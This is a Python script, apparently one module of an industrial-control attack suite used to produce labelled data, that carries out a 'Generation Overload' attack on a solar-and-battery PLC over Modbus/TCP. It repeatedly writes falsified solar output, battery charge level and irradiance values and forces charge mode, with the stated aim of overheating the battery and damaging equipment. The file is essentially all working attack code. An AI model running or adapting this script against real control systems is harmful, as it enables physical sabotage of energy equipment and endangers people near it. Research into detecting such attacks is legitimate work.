"""
Attack #7: Generation_Overload (Generation Overload Sabotage)
==================================================================
Target register: HR14 (Solar x10) + HR20 (SoC) + HR22 (Irradiance)
Technique: Reports extremely high solar generation and a near-empty
           battery to force the PLC to charge the battery dangerously.
Effect: Battery overheating, voltage rise, and equipment damage.
MITRE ATT&CK for ICS: T0831 - Manipulation of Control
"""
import time, sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from pymodbus.client import ModbusTcpClient
from attacks.config import (PLC_IP, PLC_PORT, UNIT_ID,
    HR14_SOLAR_KW, HR20_SOC, HR22_IRRADIANCE, HR3_BATTERY,
    LABEL_GENERATION_OVERLOAD)

ATTACK_NAME = "Generation_Overload"
ATTACK_ID   = LABEL_GENERATION_OVERLOAD

# Fake values: Solar=400kW (x10=4000), SoC=10%, Irradiance=1100, Battery=Charge
FAKE_SOLAR   = 4000   # 400.0 kW (x10 scale) - fake 100% full-capacity signal
FAKE_SOC     = 10     # 10% - "battery is nearly empty, charge it now!"
FAKE_IRRAD   = 1100   # 1100 W/m2 - very strong sunlight
FORCE_CHARGE = 2      # HR3=2 -> force the battery into charge mode

def run_attack(duration_sec=600, label_manager=None):
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
    if not client.connect():
        print(f"[-] PLC connection failed: {PLC_IP}:{PLC_PORT}")
        return False

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: {PLC_IP}:{PLC_PORT}")
    print(f"  Solar=400kW(Max), SoC=10%, Irrad=1100, Battery=CHARGE")
    print(f"  Duration: {duration_sec}s ({duration_sec//60} min)")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(ATTACK_ID, ATTACK_NAME,
            f"HR14={FAKE_SOLAR}, HR20={FAKE_SOC}, HR22={FAKE_IRRAD}, HR3={FORCE_CHARGE}")

    start_time = time.time()
    pkt_count = 0

    try:
        while (time.time() - start_time) < duration_sec:
            try:
                client.write_register(address=HR14_SOLAR_KW, value=FAKE_SOLAR)
                client.write_register(address=HR20_SOC, value=FAKE_SOC)
                client.write_register(address=HR22_IRRADIANCE, value=FAKE_IRRAD)
                client.write_register(address=HR3_BATTERY, value=FORCE_CHARGE)
                pkt_count += 4
            except Exception:
                try:
                    client.close()
                    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
                    client.connect()
                except Exception:
                    pass
                time.sleep(0.5)
                continue

            if pkt_count % 400 == 0:
                rem = duration_sec - (time.time() - start_time)
                print(f"  [OVLD] {pkt_count} packets | overload ongoing | remaining: {rem:.0f}s")
            time.sleep(0.1)

    except KeyboardInterrupt:
        print("\n  [OVLD] Manual stop!")
    finally:
        elapsed = time.time() - start_time
        client.close()
        if label_manager:
            label_manager.log_attack_end(ATTACK_ID, ATTACK_NAME,
                f"{pkt_count} packets, {elapsed:.1f}s")
        print(f"\n  [OVLD] {pkt_count} packets, {elapsed:.1f}s")
        return True

if __name__ == "__main__":
    run_attack(duration_sec=60)
